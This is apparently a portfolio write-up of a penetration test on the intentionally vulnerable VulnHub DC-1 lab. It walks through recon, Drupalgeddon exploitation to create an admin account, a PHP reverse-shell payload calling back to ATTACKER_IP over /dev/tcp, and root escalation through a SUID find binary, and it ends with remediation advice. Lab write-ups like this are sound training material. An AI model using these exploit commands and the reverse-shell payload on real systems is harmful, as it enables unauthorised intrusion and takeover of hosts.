# DC-1 — VulnHub Pentest Walkthrough

**Target:** DC-1 (VulnHub)  
**Operating System:** Linux (Debian)  
**Primary Attack Vector:** Drupal 7 — CVE-2014-3704 (Drupalgeddon)  
**Privilege Escalation:** Misconfigured SUID binary (`/usr/bin/find`)  
**Assessment Style:** Black-box / OSCP-style methodology  
**Result:** Full system compromise (root)

---

## Executive Summary

DC-1 is an intentionally vulnerable Linux host designed to simulate a real-world web application compromise scenario.  
The system was fully compromised by exploiting a known Drupal 7 vulnerability to gain administrative access and remote code execution, followed by local privilege escalation due to an unsafe SUID configuration.

This repository demonstrates:
- A structured, repeatable pentesting methodology
- Enumeration-driven exploitation
- Analysis of failed exploitation attempts and decision-making pivots
- A complete attack path from unauthenticated access to root

All testing was conducted legally in a controlled lab environment.

---

## Attack Chain Overview

1. **Reconnaissance**
   - Network discovery and service enumeration
   - Web service fingerprinted as Drupal 7

2. **Initial Access**
   - Exploited **CVE-2014-3704 (Drupalgeddon)**
   - Created an administrative Drupal account

3. **Remote Code Execution**
   - Enabled PHP Filter module
   - Executed a PHP reverse shell as `www-data`

4. **Privilege Escalation**
   - Discovered SUID-enabled `/usr/bin/find`
   - Abused it to spawn a root shell

5. **Outcome**
   - Root-level access
   - Complete host compromise

---

## Environment

- **Attacker Machine:** Kali Linux  
- **Target IP (final run):** `192.168.56.102`  
- **Attacker IP (listener):** `ATTACKER_IP`

> Initial enumeration was performed using a NAT-style IP range during setup.  
> Final exploitation and reporting were completed on a host-only network.

---

## Reconnaissance

### Network Discovery

```bash
nmap -sn 192.168.56.0/24
Port & Service Enumeration
nmap -sS -A -T4 192.168.56.102
Key Findings
Port 80: Apache 2.2.22 (Debian)

CMS Identified: Drupal 7

Additional Services:

SSH (22)

RPCBind (111)

Enumeration
Web Enumeration
Manual browsing revealed a default Drupal installation.

Drupal Endpoint Testing
/?q=user/1  → Access denied (page exists)
/?q=user/2  → Access denied
/?q=user/3  → Page not found
These responses aligned with standard Drupal user enumeration behavior and further confirmed the CMS fingerprint.

Exploit Research
searchsploit drupal 7
This revealed multiple Drupal 7 attack vectors, including
CVE-2014-3704 (Drupalgeddon).

Failed Attempts (Documented Intentionally)
This section reflects real-world pentesting conditions, where tooling and assumptions often fail before the environment does.

❌ Attempt 1 — Version Disclosure via CHANGELOG
http://10.0.2.6/CHANGELOG.txt
Result: 404 Not Found

Takeaway:
Version files are not always exposed. Drupal was still confidently identified through headers, page structure, and service fingerprinting.

❌ Attempt 2 — Fragile Drupal PHP Exploit PoCs
Older Drupal 7 PHP-based exploits were tested in an attempt to achieve direct command execution.

php 35150.php http://10.0.2.6 "id"
Errors Observed

include(common.inc): Failed to open stream
please state the cookie url. It works only with https urls.
Why It Failed

Missing local dependencies

HTTPS and cookie assumptions not present on the target

Decision:
Abandoned brittle tooling in favor of a reliable and target-appropriate exploit.

❌ Attempt 3 — Drupalgeddon2 PoC Issues
Tested 44448.py (Drupalgeddon2-era exploit).

Python 2 input() evaluation issue

SyntaxError: invalid syntax
Cause: Python 2 input() evaluates user input as code.

Malformed request construction

HTTPConnectionPool(host='10.0.2.6user', ...)
Decision:
Drupalgeddon2 was unnecessary. DC-1 is reliably exploitable via CVE-2014-3704.

❌ Attempt 4 — Incorrect Script Invocation
python2 34992.py -t http://10.0.2.6
Usage: 34992.py -t http[s]://TARGET_URL -u USER -p PASS
Note:
This was not a real failure — required arguments were missing.

Successful Exploitation
Initial Access — Drupalgeddon (CVE-2014-3704)
python2 34992.py -t http://192.168.56.102 -u oscpadmin -p 'REDACTED'
Result

Administrative Drupal account created

Full access to the Drupal admin dashboard

Remote Code Execution — PHP Filter Abuse
From the Drupal administrative interface:

Enabled the PHP Filter module

Created a new page

Set Text format → PHP code

Inserted a reverse shell payload

Listener

nc -lvnp 4444
Payload

<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
Result

Reverse shell obtained as www-data

Shell Stabilization
python -c 'import pty; pty.spawn("/bin/bash")'
whoami
# www-data
Privilege Escalation
SUID Enumeration
find / -perm -4000 2>/dev/null
Finding

/usr/bin/find
Exploitation
/usr/bin/find . -exec /bin/bash -p \; -quit
whoami
# root
Proof of Compromise (Redacted)
cat /var/www/flag1.txt
cat /var/www/sites/default/settings.php
cat /root/thefinalflag.txt
Flags, credentials, and sensitive values have been intentionally redacted.

Impact
Full web application takeover

Remote code execution

Sensitive configuration disclosure

Privilege escalation to root

Complete system compromise

Remediation Recommendations
Upgrade and patch Drupal installations

Disable dangerous modules (e.g. PHP Filter)

Remove unnecessary SUID permissions

Restrict access to configuration files

Implement continuous patching and monitoring

Lessons Learned
Not all public exploits are production-ready

Tooling failures require fast, informed pivots

Documenting failed paths improves efficiency and repeatability

DC-1 strongly reinforces OSCP-style methodology:

Enumerate → Exploit → Stabilize → Enumerate → PrivEsc

Disclaimer
This repository is for educational and portfolio purposes only.
All techniques were executed against a local, intentionally vulnerable system.

